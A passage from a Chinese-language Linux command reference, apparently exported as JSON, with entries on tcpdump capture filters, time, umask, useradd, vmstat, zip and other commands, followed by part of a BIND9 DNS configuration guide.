输出结果中，不把ip转换成主机名（默认显示的是主机名） -N 不列出域名； -O 不将数据包编码最佳化； -p 不让网络界面进入混杂模式； -q 快速输出，仅列出少数的传输协议信息(简要的数据包信息) -r <file> 从指定的文件读取数据包数据, 不再从网络获取数据包 -w <file> 将抓取的数据包保存到文件，-r 参数可以从文件中读取数据包 -W <filecount> 指定文件的数量，当文件滚动到指定数量后会从第一个文件开始覆盖 -s <数据包大小> 设置每个数据包的大小； -S 用绝对而非相对数值列出TCP关联数； -t 不输出时间戳 -t t 在每列倾倒资料上显示未经格式化的时间戳记； -T <数据包类型> 强制将表达方式所指定的数据包转译成设置的数据包类型； -v 详细显示指令执行过程； -v v 更详细显示指令执行过程； -x 用十六进制字码列出数据包资料； -w <数据包文件> 把数据包数据写入指定的文件。 除了以上参数，还有一些关键字可以用来进行条件过滤，常用关键字如下: host 过滤主机，如 tcpdump host 192.168.1.110 只抓取经过这个ip的数据包 src 用来过滤请求来源方的参数，如：tcpdump src host 192.168.1.110, 只抓取从这个ip过来的数据包 dst 用来过滤请求接收方的参数，如：tcpdump dst host 192.168.1.110, 只抓取发送到这个ip的数据包 port 过滤端口，如：tcpdump port 8080, 只抓取经过8080端口的数据包 net 过滤网络，如：tcpdump net 192.168, 只抓取经过这个网段的数据包 and, not, or 条件过滤，和字面意思一样。如：tcpdump net 192.168 and port 8080 抓取经过192.168网段并经过8080端口的数据包 数据包分析 抓取的数据包格式如下: $ sudo tcpdump -i any port 443 tcpdump: data link type PKTAP tcpdump: verbose output suppressed, use -v[v]... for full protocol decode listening on any, link-type PKTAP (Apple DLT_PKTAP), snapshot length 524288 bytes 18:23:05.458511 IP6 240e:399:299:b5e0:91fd:8c93:e300:58e0.63539 > 240e:d9:a600:834::15.https: Flags [.], ack 2868012794, win 4096, length 0 18:23:05.463866 IP6 240e:d9:a600:834::15.https > 240e:399:299:b5e0:91fd:8c93:e300:58e0.63539: Flags [.], ack 1, win 285, length 0 18:23:07.904922 IP 49.7.149.118.https > 192.168.101.4.61893: Flags [P.], seq 3360794318:3360794350, ack 4281540851, win 65, length 32 18:23:07.905058 IP 192.168.101.4.61893 > 49.7.149.118.https: Flags [.], ack 32, win 4096, length 0 详细数据对应为: 18:23:07.905058 IP 192.168.101.4.61893 > 49.7.149.118.https: Flags [.], ack 32, win 4096, length 0 时间戳 IP请求发送方的ip和端口 > 请求接收方的ip和端口 ack-包类型 length-报文体的长度 Flags-标识和状态 win-表示当前窗口的可用大小 时间戳 时:分:秒.微秒 IP 网际网络协议的名称 请求发送方的ip和端口 > 请求接收方的ip和端口 端口有时会显示为某个网络协议，如http、ssh、mysql等* Flags [R] flag标识和状态，可选的状态有: [S.] [.] [P.] [F.][R] seq、ack、fin 表示tcp协议的3次握手和4次挥手的过程。 seq表示请求的序列号，ack是回答的序列号，fin表示完成。 这里显示的序列号是相对值，-S参数可以显示绝对值 win 表示当前窗口的可用大小 length 报文体的长度，从长度可以简单分析是否正确接收了请求 通过以上结果只能做简单的分析，可以使用 -w 参数把数据包写入文件， 文件中记录的数据包比命令行要详细的多。 借助分析工具可以对文件进一步分析， 这里推荐使用Wireshark，这个工具是开源的，开箱即用使用简单，这里不做详细介绍了 常用的命令组合 抓取8080端口的数据包: tcpdump -i any port 8080 抓取从192.168.1.110发送到192.168.1.111的数据包: tcpdump -i any src host 192.168.1.110 and dst host 192.168.1.111 抓取192.168网段除了192.168.1.110的请求的数据包: tcpdump -i any src net 192.168 and 'src host not 192.168.1.110' 抓取8080端口的数据包并写入dump.log文件中: tcpdump -i any port 8080 -w dump.log 注意事项 tcpdump需要用管理员权限运行，可以用sudo命令或者root用户 抓取的数据包通过length字段只能做一些简单的判断，想要详细分析，需要借助数据包分析工具，如：Wireshark","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-tcpdump.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-tcpdump.html"},{"title":"test","text":"判断 跟shell的if语句差不多: -nt newer than 判断 file1 是否比 file2 新 -ot older than 判断 file1 是否比 file2 旧 -ef 判断 file1 和 file2 是否为同一文件，可用在判断 hard link 的判定。即，判定两个文件是否指向同一个 inode 如: test file -nt file2","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-test.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-test.html"},{"title":"time","text":"统计给定命令所花费的总时间 语法: time(参数) 参数 指令：指定需要运行的额指令及其参数。 实例 当测试一个程序或比较不同算法时，执行时间是非常重要的， 一个好的算法用时一定是较优的。 所有类UNIX系统都包含time命令，使用这个命令可以统计时间消耗。例如: [root@localhost ~]# time ls anaconda-ks.cfg install.log install.log.syslog satools text real 0m0.009s user 0m0.002s sys 0m0.007s 输出的信息分别显示了该命令所花费的real时间、user时间和sys时间。 real时间 指挂钟时间，也就是命令开始执行到结束的时间。这个短时间包括其他进程所占用的时间片，和进程被阻塞时所花费的时间。 user时间 指进程花费在用户模式中的CPU时间，这是唯一真正用于执行进程所花费的时间，其他进程和花费阻塞状态中的时间没有计算在内。 sys时间 指花费在内核模式中的CPU时间，代表在内核中执系统调用所花费的时间，这也是真正由进程使用的CPU时间。 shell内建也有一个time命令，当运行time时候是调用的系统内建命令， 因为系统内建的功能有限，所以需要时间其他功能需要使用time命令可执行二进制文件 /usr/bin/time 使用 -o 选项将执行时间写入到文件中: /usr/bin/time -o outfile.txt ls 使用 -a 选项追加信息: /usr/bin/time -a -o outfile.txt ls 使用 -f 选项格式化时间输出: /usr/bin/time -f \"time: %U\" ls -f 选项后的参数 参数 描述 %E real时间，显示格式为[小时:]分钟:秒 %U user时间。 %S sys时间。 %C 进行计时的命令名称和命令行参数。 %D 进程非共享数据区域，以KB为单位。 %x 命令退出状态。 %k 进程接收到的信号数量。 %w 进程被交换出主存的次数。 %Z 系统的页面大小，这是一个系统常量，不用系统中常量值也不同。 %P 进程所获取的CPU时间百分百，这个值等于 user+system 时间除以总共的运行时间。 %K 进程的平均总内存使用量（data+stack+text），单位是 KB 。 %w 进程主动进行上下文切换的次数，例如等待I/O操作完成。 %c 进程被迫进行上下文切换的次数（由于时间片到期）。","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-time.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-time.html"},{"title":"touch","text":"创建空文件 指定时间的文件创建: touch -t '202110211245.23' te.txt","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-touch.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-touch.html"},{"title":"ttygif","text":"终端录屏工具 github地址: https://github.com/icholy/ttygif debian安装: apt install ttygif mac安装: brew install ttygif 用法: ttygif [option] <in_file> [out.gif] in_file: 从哪个 text/x-script 文件读取输入 out.gif: 输出文件名, 默认为 tty.gif 选项(不同系统的貌似有点不一样): -f, --fullscreen : include window border -s, --speed : Set speed [1.0] -h, --help : print this help -v, --version : print version 终端录制 开始录制: ttyrec <file_name> 若不给 file_name , 则默认生成的文件是 ttyrecord , 也可以使用 /docs/操作系统/linux/linux指令/script 或者 /docs/操作系统/linux/linux指令/asciinema , 都支持生成 text/x-script 文件 退出录制(或者直接 Ctrl + D ): exit 将 text/x-script 文件转换为gif: ttygif <file_name> 附一个完整的流程 code: ttyrec out.cast echo this is a test exit # 这个时候就退出录制了 会在当前目录下生成out.cast # 转换为gif文件, 默认会在当前目录下生成tty.gif, 貌似不支持直接指定文件名 ttygif out.cast 注解 如果不是很需要, 建议使用小一点的终端, 不然全屏录制会比较占空间","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-ttygif.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-ttygif.html"},{"title":"umask","text":"参考:: Linux 命令大全 Linux umask命令指定在建立文件时预设的权限掩码。 umask可用来设定 [权限掩码]。 [权限掩码]是由3个八进制的数字所组成，将现有的存取权限减掉权限掩码后，即可产生建立文件时预设的权限。 语法: umask [-S][权限掩码] 参数说明 -S 以文字的方式来表示权限掩码。 实例 使用指令\"umask\"查看当前权限掩码: $ umask #获取当前权限掩码 执行上面的指令后，输出信息如下: 0022 接下来，使用指令\"mkdir\"创建一个目录， 并使用指令\"ls\"获取该目录的详细信息: $ mkdir test1 #创建目录 $ ls –d –l test1/ #显示目录的详细信息 执行上面的命令后，将显示新创建目录的详细信息，如下所示: drwxr-xr-x 2 rootlocal rootlocal 4096 2011-9-19 21:46 test1/ 注意：在上面的输出信息中，\"drwxr-xr-x\"=\"777-022=755\"。","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-umask.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-umask.html"},{"title":"umount","text":"卸载已经加载的文件系统。利用设备名或挂载点都能umount文件系统， 不过最好还是通过挂载点卸载，以免使用绑定挂载（一个设备，多个挂载点）时产生混乱。 语法: umount(选项)(参数) 选项 -a 卸除/etc/mtab中记录的所有文件系统； -h 显示帮助； -n 卸除时不要将信息存入/etc/mtab文件中； -r 若无法成功卸除，则尝试以只读的方式重新挂入文件系统； -t <文件系统类型> 仅卸除选项中所指定的文件系统； -v 执行时显示详细的信息； -V 显示版本信息。 参数: 文件系统：指定要卸载的文件系统或者其对应的设备文件名。 延迟卸载（lazy unmount）会立即卸载目录树里的文件系统， 等到设备不再繁忙时才清理所有相关资源. 卸载可移动存储介质还可以用 eject 命令. 下面这条命令会卸载 [cd](http://man.linuxde.net/cd) 并弹出CD: eject /dev/cdrom 卸载并弹出CD","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-umount.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-umount.html"},{"title":"uniq","text":"忽略重复的行 -c , --count 在每行开头增加重复次数。 -d , --repeated 所有邻近的重复行只被打印一次。输出出现次数大于1的内容 -D 所有邻近的重复行将全部打印。 -u 输出出现次数为1的内容","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-uniq.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-uniq.html"},{"title":"unset","text":"与 /docs/操作系统/linux/linux指令/set 相反 unset删除变量或者函数: -f #仅删除函数 -v #仅删除变量","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-unset.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-unset.html"},{"title":"unzip","text":"unzip 命令可以查看和解压缩 zip 文件。 与 /docs/操作系统/linux/linux指令/zip 相反. 该命令的基本格式如下: unzip [选项] 压缩包名 选项: -d 目录名 将压缩文件解压到指定目录下。 -n 解压时并不覆盖已经存在的文件。 -o 解压时覆盖已经存在的文件，并且无需用户确认。 -v 查看压缩文件的详细信息，包括压缩文件中包含的文件大小、文件名以及压缩比等，但并不做解压操作。 -t 测试压缩文件有无损坏，但并不解压。 -x 文件列表 解压文件，但不包含文件列表中指定的文件。","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-unzip.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-unzip.html"},{"title":"update-alternatives","text":"貌似只有GUI界面才有用 (DEBIAN系列专有) 用软链接的方式处理系统中软件版本的切换，使其多版本共存. alternatives 的管理目录 /etc/alternatives 管理方式 主要是三层路径 第一层路径, 软链接, 一般是系统的默认PATH下, 主要是: /usr/bin 下面或者 /usr/local/bin 下. 链接的目标为第二层路径. 第二层路径, 软链接, 为alternatives的管理目录 /etc/alternatives 链接目标为第三层. 第三层路径, 执行文件的真实路径, 可以为任意路径, 比如自己安装的Python /usr/local/mypython/bin/python 用法 用法: update-alternatives [<选项> ...] <命令> 命令: --install <链接> <名称> <路径> <优先级> [--slave <链接> <名称> <路径>] ... 在系统中加入一组候选项。 --remove <名称> <路径> 从 <名称> 替换组中去除 <路径> 项。 --remove-all <名称> 从替换系统中删除 <名称> 替换组。 --auto <名称> 将 <名称> 的主链接切换到自动模式。 --display <名称> 显示关于 <名称> 替换组的信息。 --query <名称> 机器可读版的 --display <名称>. --list <名称> 列出 <名称> 替换组中所有的可用候选项。 --get-selections 列出主要候选项名称以及它们的状态。 --set-selections 从标准输入中读入候选项的状态。 --config <名称> 列出 <名称> 替换组中的可选项，并就使用其中哪一个，征询用户的意见。 --set <名称> <路径> 将 <路径> 设置为 <名称> 的候选项。 --all 对所有可选项一一调用 --config 命令。 <链接> 是指向 /etc/alternatives/<名称> 的符号链接。(如 /usr/bin/pager) <名称> 是该链接替换组的主控名。(就是/etc/alternatives/<名称>的<名称>, 如 pager) <路径> 是候选项目标文件的位置。(真实路径, 如 /usr/bin/less) <优先级> 是一个整数，在自动模式下，这个数字越高的选项，其优先级也就越高。 .......... install的说明, 举例, 将 /path/to/javac 设置为优先级为 100 的 javac 可替代项， 并将 /usr/bin/java 关联到主项 /path/to/java sudo update-alternatives --install /usr/bin/javac javac /path/to/javac 100 --slave /usr/bin/java java /path/to/java 以便于将从属项与主项关联起来，并在切换主项时自动更新从属项的链接 实际应用 当安装了多个编辑器或者多个不同版本的软件如JAVA时, 可以用来处理执行时使用哪个JAVA. 安装时候, 添加到管理: update-alternatives --install /usr/local/bin/java java /usr/local/myjava/bin/java 10 这个时候使用会自动按照优先级的顺序来选择, 可以看看java已经注册了哪些: update-alternatives --display java 如果需要手动选择, 可使用config打开一个交互式界面让用户手动选择: update-alternatives --config java 重新修改为自动: update-alternatives --auto java 如果需要直接设置: update-alternatives --set java /usr/local/myjava/bin/java","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-update-alternatives.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-update-alternatives.html"},{"title":"update-desktop-database","text":"以GNOME桌面环境为例, 桌面环境的应用菜单并不是实时扫描所有的 .desktop 文件,而是维护一个桌面文件的数据库。 当 .desktop 文件发生变化时,需要运行 update-desktop-database 来刷新这个数据库 如扫描 /usr/share/applications 目录下的 .desktop 文件,并更新桌面环境的应用菜单数据库: update-desktop-database /usr/share/applications","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-update-desktop-database.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-update-desktop-database.html"},{"title":"useradd","text":"功能 linux增加用户 选项 useradd选项 选项 -m 自动建立用户目录 -c<备注> 加上备注文字。备注文字会保存在passwd的备注栏位中； -d<登入目录> 指定用户登入时的启始目录； -D 变更预设值； -e<有效期限> 指定帐号的有效期限； -f<缓冲天数> 指定在密码过期后多少天即关闭该帐号； -g<群组> 指定用户所属的群组； -G<群组> 指定用户所属的附加群组； -m 自动建立用户的登入目录； -M 不要自动建立用户的登入目录； -n 取消建立以用户名称为名的群组； -r 建立系统帐号； -s<shell> 指定用户登入后所使用的shell； -u<uid> 指定用户id。 使用 通用, 建立用户 yanque , 自动建立用户目录, 登录shell /bin/bash , 指定用户登入目录为 /home/yanque , 不指定用户组, 会自动建立用户群组 yanque useradd yanque -m -s /bin/bash -d /home/yanque","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-useradd.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-useradd.html"},{"title":"vmstat","text":"vmstat是Virtual Meomory Statistics（虚拟内存统计）的缩写， 可对操作系统的虚拟内存、进程、CPU活动进行监控。 它是对系统的整体情况进行统计， 不足之处是无法对某个进程进行深入分析。 vmstat工具提供了一种低开销的系统性能观察方式。 因为vmstat本身就是低开销工具， 在非常高负荷的服务器上， 你需要查看并监控系统的健康情况，在控制窗口还是能够使用vmstat输出结果。 语法: vmstat [-a] [-n] [-S unit] [delay [ count]] vmstat [-s] [-n] [-S unit] vmstat [-m] [-n] [delay [ count]] vmstat [-d] [-n] [delay [ count]] vmstat [-p disk partition] [-n] [delay [ count]] vmstat [-f] vmstat [-V] 选项 -a 显示活跃和非活跃内存 -f 显示从系统启动至今的fork数量 。 -m 显示slabinfo -n 只在开始时显示一次各字段名称。 -s 显示内存相关统计信息及多种系统活动数量。 -d 显示磁盘相关统计信息 -p 显示指定磁盘分区统计信息 -S 使用指定单位显示。参数有 k 、K 、m 、M， 分别代表1000、1024、1000000、1048576字节（byte）。默认单位为K（1024 bytes） -V 显示vmstat版本信息。 delay 刷新时间间隔。如果不指定，只显示一条结果。 count 刷新次数。如果不指定刷新次数，但指定了刷新时间间隔，这时刷新次数为无穷。 输出含义 如直接执行: # vmstat procs -----------memory---------- ---swap-- -----io---- -system-- ------cpu----- r b swpd free buff cache si so bi bo in cs us sy id wa st 2 0 0 6300920 268396 937448 0 0 1944 289 532 779 1 2 97 1 0 procs r 列表示运行和等待cpu时间片的进程数，如果长期大于1，说明cpu不足，需要增加cpu; b 列表示在等待资源的进程数，比如正在等待I/O、或者内存交换等 memory swpd 切换到内存交换区的内存数量(k表示), 如果swpd的值不为0，或者比较大，比如超过了100m，只要si、so的值长期为0，系统性能还是正常 free 当前的空闲页面列表中内存数量(k表示) buff 作为buffer cache的内存数量，一般对块设备的读写才需要缓冲。 cache: 作为page cache的内存数量，一般作为文件系统的cache， 如果cache较大，说明用到cache的文件较多，如果此时IO中bi比较小，说明文件系统效率比较好。 swap si 由磁盘进入内存交换区数量 so 由内存交换区进入磁盘数量 IO bi 从块设备读入数据的总量（读磁盘）（每秒kb） bo 块设备写入数据的总量（写磁盘）（每秒kb） 这里我们设置的bi+bo参考值为1000，如果超过1000， 而且wa值较大应该考虑均衡磁盘负载，可以结合iostat输出来分析。 system 显示采集间隔内发生的中断数 in 列表示在某一时间间隔中观测到的每秒设备中断数 cs列表示每秒产生的上下文切换次数，如当 cs 比磁盘 I/O 和网络信息包速率高得多，都应进行进一步调查。 cpu 表示cpu的使用状态 us 列显示了用户方式下所花费 CPU 时间的百分比。 us的值比较高时，说明用户进程消耗的cpu时间多，但是如果长期大于50%，需要考虑优化用户的程序。 sy 列显示了内核进程所花费的cpu时间的百分比。这里us + sy的参考值为80%，如果us+sy 大于 80%说明可能存在CPU不足。 id 列显示了cpu处在空闲状态的时间百分比 wa 列显示了IO等待所占用的CPU时间的百分比。 如果wa超过30%，说明IO等待严重， 这可能是磁盘大量随机访问造成的，也可能磁盘或者磁盘访问控制器的带宽瓶颈造成的(主要是块操作)。 参考: https://zhuanlan.zhihu.com/p/162711990","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-vmstat.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-vmstat.html"},{"title":"who","text":"查看当前所有登录系统的用户信息 支持的选项/参数: -m, am i 只显示执行who命令的用户名, 登陆终端和登录时间 -q, --count 只显示用户的登录账号和登录用户数量 -u 在登录时间后显示用户最后一次操作时间到当前时间的间隔 --heading 显示列标题","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-who.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-who.html"},{"title":"zip","text":"压缩文件, zip 是个使用广泛的压缩程序，压缩后的文件后缀名为 .zip。 语法: zip [-AcdDfFghjJKlLmoqrSTuvVwXyz$][-b <工作目录>][-ll][-n <字尾字符串>][-t <日期时间>][-<压缩效率>][压缩文件][文件...][-i <范本样式>][-x <范本样式>] 参数: -A 调整可执行的自动解压缩文件。 -b<工作目录> 指定暂时存放文件的目录。 -c 替每个被压缩的文件加上注释。 -d 从压缩文件内删除指定的文件。 -D 压缩文件内不建立目录名称。 -f 更新现有的文件。 -F 尝试修复已损坏的压缩文件。 -g 将文件压缩后附加在既有的压缩文件之后，而非另行建立新的压缩文件。 -h 在线帮助。 -i<范本样式> 只压缩符合条件的文件。 -j 只保存文件名称及其内容，而不存放任何目录名称。 -J 删除压缩文件前面不必要的数据。 -k 使用MS-DOS兼容格式的文件名称。 -l 压缩文件时，把LF字符置换成LF+CR字符。 -ll 压缩文件时，把LF+CR字符置换成LF字符。 -L 显示版权信息。 -m 将文件压缩并加入压缩文件后，删除原始文件，即把文件移到压缩文件中。 -n<字尾字符串> 不压缩具有特定字尾字符串的文件。 -o 以压缩文件内拥有最新更改时间的文件为准，将压缩文件的更改时间设成和该文件相同。 -q 不显示指令执行过程。 -r 递归处理，将指定目录下的所有文件和子目录一并处理。 -S 包含系统和隐藏文件。 -t<日期时间> 把压缩文件的日期设成指定的日期。 -T 检查备份文件内的每个文件是否正确无误。 -u 与 -f 参数类似，但是除了更新现有的文件外，也会将压缩文件中的其他文件解压缩到目录中。 -v 显示指令执行过程或显示版本信息。 -V 保存VMS操作系统的文件属性。 -w 在文件名称里假如版本编号，本参数仅在VMS操作系统下有效。 -x<范本样式> 压缩时排除符合条件的文件。 -X 不保存额外的文件属性。 -y 直接保存符号连接，而非该连接所指向的文件，本参数仅在UNIX之类的系统下有效。 -z 替压缩文件加上注释。 -$ 保存第一个被压缩文件所在磁盘的卷册名称。 -<压缩效率> 压缩效率是一个介于1-9的数值。 实例 将 /home/html/ 这个目录下所有文件和文件夹打包为当前目录下的 html.zip: zip -q -r html.zip /home/html 注, 如果在我们在 /home/html 目录下，可以执行以下命令: zip -q -r html.zip * 来实现一样效果. 从压缩文件 cp.zip 中删除文件 a.c: zip -dv cp.zip a.c","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-zip.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-zip.html"},{"title":"一些常见发行版下载","text":"Ubuntu 官网: https://cn.ubuntu.com/download/desktop Ubuntu14: https://releases.ubuntu.com/trusty/ Ubuntu22: https://releases.ubuntu.com/22.04/ubuntu-22.04.3-desktop-amd64.iso 注解 发行版的 LTS 表示长期支持(一般都是五年吧)","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Some-common-release-versions-download.html","loc":"/yq-doc-source-docs-operating-system-linux-Some-common-release-versions-download.html"},{"title":"一些安全相关文件","text":"# todo: /etc/login.defs umask 命令, 创建文件权限减去umask设置的值 /etc/login.defs 定义与 /etc/passwd , /etc/shadow 配套的用户限制设置 /etc/knockd.conf ssh相关敲门 使用 nmap -p 端口号 IP地址 按照文件所给的端口依次敲门可以恢复访问","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Some-security--related-documents.html","loc":"/yq-doc-source-docs-operating-system-linux-Some-security--related-documents.html"},{"title":"xclip","text":"linux下剪切板与终端的交互.","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-package-XClip.html","loc":"/yq-doc-source-docs-operating-system-linux-package-XClip.html"},{"title":"bind9","text":"参考:: ISC BIND9 - 最详细、最认真的从零开始的 BIND 9 - DNS服务搭建及其原理讲解 前置 DNS DNS ( Domain Name Service) : 域名解析服务, 将字符串域名解析为数字IP DNS ZONE DNS域，被用来划分DNS主域。 传统的DNS域类似一个树状的结构，被分成不同的区域，这些区域可区分一个DNS服务器中命名空间中不同的区域。 DNS区域是构成DNS命名空间的一部分，由特定组织或管理员加以管理，其可以对权威性域名服务器等DNS组件更加精细的控制。 域名空间是一个分层数，其中DNS的根域位于顶部，DNS区域始于该树中的一个域，并且可以扩展到下边的子域。 资源记录类型 资源记录类型 字符串 含义 A Address地址， IPv4 AAAA Address地址 IPv6 NS Name Server域名服务器 SOA Start of Authority 起始授权机构 MX Mail Exchanger 邮件交换 CNAME Canonical Name规范名. CNAME-records ( Canonical name for an alias )是域名的别名。 PTR Pointer 指针，即反向DNS系统，用于查询IP地址时给出相关的域名，即查询IP地址的PTR记录给出该IP指向的域名，在 Zone 文件中被设置； TXT Text，网络名称系统的记录，可讲文字信息提供给网络意外的来源，其中有一个非常重要的功能就是当外部查询需要显示BIND的相关版本号时，可以指定 TXT查询，这个配置是默认的；谷歌会使用 TXT 记录来验证网站的拥有权以及确保电子邮件的安全； SRV Service 记录，域名中用于指定服务器并提供服务的位置：主机、端口号；一般在 Zone File 中被定义； FQDN FQDN(Fully Qualified Domain Name) 完全合格域名/全程域名，即域名可以通过DNS进行解析，其公式 FQDN = HostName + Domain。 解决多服务问题, 比如域名为 yanquer.con , ftp 用 ftp.yanquer.com , ssh 用 ssh.yanquer.com 介绍 bind9 是目前市面是最主流的开源DNS软件 安装: apt install bind9 配置文件位置: /etc/bind/named.conf 查看其内容: root@6c378cbe42dd:/# cat /etc/bind bind/ bindresvport.blacklist root@6c378cbe42dd:/# cat /etc/bind/named.conf // This is the primary configuration file for the BIND DNS server named. // // Please read /usr/share/doc/bind9/README.Debian.gz for information on the // structure of BIND configuration files in Debian, *BEFORE* you customize // this configuration file. // // If you are just adding zones, please do that in /etc/bind/named.conf.local include \"/etc/bind/named.conf.options\"; include \"/etc/bind/named.conf.local\"; include \"/etc/bind/named.conf.default-zones\"; 可以看到其引用了三个文件: /etc/bind/named.conf.options : named.conf.options /etc/bind/named.conf.local : named.conf.local /etc/bind/named.conf.default-zones : named.conf.default-zones 配置文件说明 以下文件都在 /etc/bind/ 目录下 注意不要更改文件权限 named.conf.options option 配置 named.conf.local Zone 的引导配置文件 定义了 BIND9 中的 ZONE（区域）文件在named.conf.local文件中的定义，用于定义存储解析的域名的数据库文件，即域名与IP地址的映射关系以及DNS发送的解析域名数据包的相关参数设置，其定义的格式如下: zone \"<YOUR DNS Domain Name >\" { <Configurations> } 也可以定义反向解析域名通过以下的格式进行定义: zone \"<YOUR IP ADDRESS>-addr.arpa\" { <Configurations> } Configurations 常用参数配置如下: file: 用于指出域名与IP地址解析的数据库配置文件； allow-transfer: 这个地方的配置是用来给出 Failover 或者是 递归查询DNS服务器的IP地址，如果之前在 options 里配置的allow-transfer 如果设置成了参数 yes， 那么需要在这里指出递归查询服务器的IP地址； type: 用于指定当前DNS解析服务器的位置，是主服务器 master 还是从服务器 slaver named.conf.default-zones 机器默认域名配置: # vim /etc/default/bind9 OPTIONS=\"-u bind -4\" Zone File 保存 RR (Record Resource) 信息的文件 DNS Record Types 分为很多种 地址解析 ( Address Records) 别名记录（Alias Records） 邮件交换记录（Email Exchange Records） 域名服务器记录（Name Server Records）； 确定你的需求，再编写你的Zone File； 配置含义说明 在 zone file 中，注释的符号是： ; (分号) @ ( at - sign ) 是代表当前的区域，即 每一个 域名就是一个区域(region)， 一般在 $ORIGIN [REGION NAME] 设定了当前作用的区域，作用区域是代表当前的解析域名区域； 例: ; ; BIND data file for local loopback interface ; ; Import ZSK / KSK ; ; $ORIGIN domain.com. ; 我们已经定义了一个区域，那么在定义 SOA 的时候可以进行两种定义方式 @ IN SOA ns.domain.com. admin.domain.com. ( 3 ; Serial 604800 ; Refresh 86400 ; Retry 2419200 ; Expire 604800 ) ; Negative Cache TTL ; 或者我们不需要 at-sign - @ 符号，直接引用ORIGIN的名字 ；在这里这两条配置代表的含义是一样的 domain.com. ns.domain.com. admin.domain.com. ( 3 ; Serial 604800 ; Refresh 86400 ; Retry 2419200 ; Expire 604800 ) ; Negative Cache TTL 上边的配置中 @ 代表了当前的区域 domain.com. domain.com. 就是当前的区域 Zone File - TTL TTL 规定了Resource Record 的失效时间，即当前资源记录能够被缓存的时间长短，默认的单位为秒，能够设定的最大时间长度是 32 bit 的整形变量 ( 0 到 4294967295 )，单位是秒；RR都会被保存在DNS的解析服务器的cache上，有一个失效的时间，TTL就是控制这个失效时间的一个参数； 这个参数可以单独进行设定，也可以在 SOA 设定中进行配置： 单独设定： $TTL [TIME] 在 SOA 中进行设定： SOA - Negative Cache TTL 例: $TTL 6048000 Zone File - SOA SOA - Start of Authority， 起始授权部分，是每一个 Zone File 必须包含的部分，也是包含域名的关键信息。 如果有多台DNS来管理同一个域名，就需要在 zone file 中规定如何规定两个域名解析服务器了 - Name Server； 即需要在定义 Zone Fie 的时候，需要特别明确 SOA 的定义，SOA 定义了域名解析服务器的对于区域 (Location) 的数据信息来源，即规定了解析区域的IP相关地址； 每一个域名区域都需要一个 SOA 记录； 定义的方式是: [LOCATION NAME] IN SOA [PRIMARY_DNS_SERVER_NAME] [EMAIL_ADDRESS_NAME] ( 1 ; Serial 3h ; Refresh after 3 hours 1h ; Retry after 1 hour 1w ; Expire After 1 Week 1h ; Negative caching TTL of 1 day ) 配置举例: domain.com. ns.domain.com. admin.domain.com. ( 3 ; Serial 604800 ; Refresh 86400 ; Retry 2419200 ; Expire 604800 ) ; Negative Cache TTL 解释一下上边的相关参数： Location Name 从前边 $ORIGIN 我们已经知道是一个区域的名称，或者用 @ 进行代替； PRIMARY_DNS_SERVER_NAME 用于规定解析当前域名的主服务器，这个服务器的IP地址以及详细资源需要在后边被规定； EMAIL_ADDRESS_NAME 指定了管理员的 Email 地址，以上边为例： admin.domain.com. == admin@domain.com. Serial 序号，代表着当前数据库文件的新旧， 该值越大表示当前数据库的配置越新，一般来说这个值设定的值遵循 YYYYMMMMDDDD 的格式； 这个数值必须小于 4294967296；在这里涉及到一个 从服务器 ( Slave )的 配置问题，如果你需要 从服务器 何时从主服务器拉取最新的配置，就需要保持从服务器这个数值低于主服务器的数值； Refresh 更新的频率，设置 Slave DNS 服务器 去向 主服务器 进行配置更新的周期； Retry 失败重新尝尝试时间，如果 Slave 服务器无法对 Master 进行链接，则需要设置这个值规定多长时间进行一次重试连接； Expire 是失效时间，如果一直失败连接，那么这个配置规定了重试连接的最大时间； Negative Cache TTL 缓存时间，在整个 zone file 都没有规定 TTL 时间的情况下，那么就以 SOA 中规定的 TTL 为主； 对于各个参数的限制: Refresh >= Retry × 2 Refresh + Retry < Expire Expire >= Retry × 10 Expire >= 7 Days 注解 在所有的配置中， ns.domain.com != ns.domain.com. ，必须注意在 zone file 中的配置文件的最后 . 必须不能省略； 如果不写最后一个的 . 那么该域名就是一个 相对名 ，结果就是在解析的过程中，这条资源就被当成 ns.domain.com.domain.com zone file - Name Server Records Name Server Records 定义了在当前 DNS服务器 中的 NS 的 IP地址，在每一个 zone file 中必须指定 主/从 域名解析器的IP地址， 使用 A 